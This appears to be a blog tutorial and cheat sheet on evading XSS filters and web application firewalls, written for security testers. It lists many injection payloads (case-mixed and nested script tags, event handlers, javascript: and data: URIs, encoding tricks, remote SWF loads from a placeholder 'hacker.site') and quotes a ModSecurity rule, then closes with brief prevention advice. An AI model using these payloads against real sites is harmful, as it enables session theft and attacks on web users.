# XSS Filter Evasion and WAF Bypassing Tactics

## Introduction

Cross-Site Scripting (XSS) attacks involve injecting malicious scripts into trustworthy websites. These attacks exploit flaws in web applications that accept user input without proper verification or encoding. Various guides and cheat sheets, like "XSS Filter Evasion Cheat Sheet" by RSnake and Cure53's initiative, aid security professionals in testing XSS problems.

This book focuses on identifying possible scenarios encountered in XSS attacks and strategies to overcome them.

### Common Scenarios

1. The XSS vector is blocked by the application or another entity.
2. The XSS vector is sanitized.
3. The XSS vector is filtered or blocked by the browser.

## Bypassing Blacklisting Filters

Blacklist mode filters, commonly used for their ease of installation, identify specific patterns to prevent malicious behavior. Bypassing these filters involves clever techniques.

### Script Code Injection

The `<script>` tag is a primary method for executing client-side scripting code. Weak tag banning rules can be exploited.

#### Getting Around Weak Tag Banning

Examples of weak rules exploitation:

- `<ScRiPt>alert(1);</ScRiPt>` - Upper- & Lower-case characters
- `<ScRiPt>alert(1);` - Upper- & Lower-case characters, without closing tag
- `<script/random>alert(1);</script>` - Random string after the tag name
- `<script>alert(1);</script>` - Newline after the tag name
- `<scr<script>ipt>alert(1)</scr<script>ipt>` - Nested tags
- `<scr\x00ipt>alert(1)</scr\x00ipt>` - NULL byte (IE up to v9)

### ModSecurity Script Tag Rule

ModSecurity filters the `<script>` tag with a rule like:

```regex
SecRule ARGS "(?i)(<script[^>]*>[\s\S]*?<\/script[^>]*>|<script[^>]*>[\s\S]*?<\/script[[\s\S]]*[\s\S]|<script[^>]*>[\s\S]*?<\/script[\s]*[\s]|<script[^>]*>[\s\S]*?)"
```

Different HTML tags and related event handlers can also be used:

- `<a href="javascript:alert(1)">show</a>`
- `<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">show</a>`
- `<form action="javascript:alert(1)"><button>send</button></form>`
- `<form id=x></form><button form="x" formaction="javascript:alert(1)">send</button>`
- `<object data="javascript:alert(1)">`
- `<object data="data:text/html,<script>alert(1)</script>">`
- `<object data="data:text/html;base64, PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">`
- `<object data="//hacker.site/xss.swf">`
- `<embed code="//hacker.site/xss.swf" allowscriptaccess=always>`

### Events and Event Handlers

HTML DOM uses events for interactivity. Various event handlers can be used for XSS:

#### HTML 4 Tags Examples

- `<body onload=alert(1)>`
- `<input type=image src=x:x onerror=alert(1)>`
- `<isindex onmouseover="alert(1)" >`
- `<form oninput=alert(1)><input></form>`
- `<textarea autofocus onfocus=alert(1)>`
- `<input oncut=alert(1)>`

#### HTML 5 Tags Examples

- `<svg onload=alert(1)>`
- `<keygen autofocus onfocus=alert(1)>`
- `<video><source onerror="alert(1)">`
- `<marquee onstart=alert(1)>`

To bypass filters, mix HTML and browser dynamics:

- `<svg/onload=alert(1)>`
- `<svg//////onload=alert(1)>`
- `<svg id=x;onload=alert(1)>`
- `<svg id=\`x\`onload=alert(1)>`

#### Control Character Bypasses

Browsers have different sets of control characters:

- **IExplorer:** `[0x09,0x0B,0x0C,0x20,0x3B]`
- **Chrome:** `[0x09,0x20,0x28,0x2C,0x3B]`
- **Safari:** `[0x2C,0x3B]`
- **FireFox:** `[0x09,0x20,0x28,0x2C,0x3B]`
- **Opera:** `[0x09,0x20,0x2C,0x3B]`
- **Android:** `[0x09,0x20,0x28,0x2C,0x3B]`

Use control characters to bypass filters.

### Keyword Based Filters

Signature-based filters may limit scripting code execution by blocking specific keywords like alert, javascript, eval, etc. Character escaping and manipulation techniques help bypass these filters.

#### Character Escaping

JavaScript offers various character escape types. For example:

- Unicode: `<script>\u0061lert(1)</script>`
- Decimal, Octal, Hexadecimal: `<img src=x onerror="\u0061lert(1)"/>`
  
#### Constructing Strings

Useful methods for constructing strings:

-

 `/ale/.source+/rt/.source`
- `String.fromCharCode(97,108,101,114,116)`
- `atob("YWxlcnQ=")`
- `17795081..toString(36)`

### Execution Sinks

Execution sinks are functions parsing strings into JavaScript code. Examples:

- `setTimeout("JSCode") //all browsers`
- `setInterval("JSCode") //all browsers`
- `setImmediate("JSCode") //IE 10+`
- `Function("JSCode") //all browsers`

Use these sinks to run JavaScript code.

### Pseudo-protocols

JavaScript pseudo-protocols like javascript:, data:, and vbscript: can be leveraged. Examples:

- `<object data="JaVaScRiPt:alert(1)">`
- `<object data="javascript&colon;alert(1)">`
- `<embed code="data:text/html,<script>alert(1)</script>">`
  
#### Data URI Scheme

Useful for bypassing filters:

- `<object data="data:text/html,<script>alert(1)</script>">`
- `<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">`

#### VBScript Pseudo-protocol

Limited to Internet Explorer, examples:

- `<img src=a onerror="vbscript:msgbox 1"/>`
- `<img src=b onerror="vbs:msgbox 2"/>`
- `<img src=c onerror="vbs:alert(3)"/>`
- `<img src=d onerror="vbscript:alert(4)"/>`

### Bypassing Sanitization

Security systems often sanitize XSS vectors instead of blocking requests entirely. This involves HTML-encoding essential characters. String manipulations, removing HTML tags, and escaping quotes are strategies for bypassing sanitization.

#### String Manipulations

Be aware of recursive tests and try different vector sequences:

- `<scr<iframe>ipt>alert(1)</script>`

#### Escaping Quotes

Escape quotes using techniques like:

- `randomkey\' alert(1); //`

#### String Generation Methods

Explore various string generation methods:

- `String.fromCharCode()`
- `unescape(/%78%u0073%73/.source)`
- `decodeURI(/alert(%22xss%22)/.source)`

## How to Prevent Cross-Site Scripting

Filtering alone is insufficient; developers play a crucial role in securing applications. Context-sensitive escaping, proper encoding, and the use of HTTP security headers help prevent XSS. Focus on developing secure code to enhance application and user security.

**Thank you for reading! Feel free to checkout out on Twitter: [@N3T_hunt3r](https://twitter.com/N3T_hunt3r)**
